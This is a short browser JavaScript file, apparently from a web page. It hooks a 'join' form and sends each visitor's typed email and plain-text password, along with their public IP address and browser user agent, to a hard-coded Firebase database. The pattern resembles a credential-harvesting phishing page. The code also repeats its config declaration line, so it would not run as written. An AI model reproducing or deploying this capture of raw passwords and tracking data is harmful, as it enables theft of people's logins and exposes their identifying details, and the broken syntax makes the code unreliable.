import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
const firebaseConfig = {
  apiKey: "AIzaSyBaNvP3PE_4T4JcbTXF8TRajkBfvzl8qe4",
  authDomain: "nahiyan-20eba.firebaseapp.com",
  databaseURL: "https://nahiyan-20eba-default-rtdb.firebaseio.com",
  projectId: "nahiyan-20eba",
  storageBucket: "nahiyan-20eba.firebasestorage.app",
  messagingSenderId: "637677914385",
  appId: "1:637677914385:web:744e691b034e2625aea4b0",
  measurementId: "G-3NKGJYNG8V"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
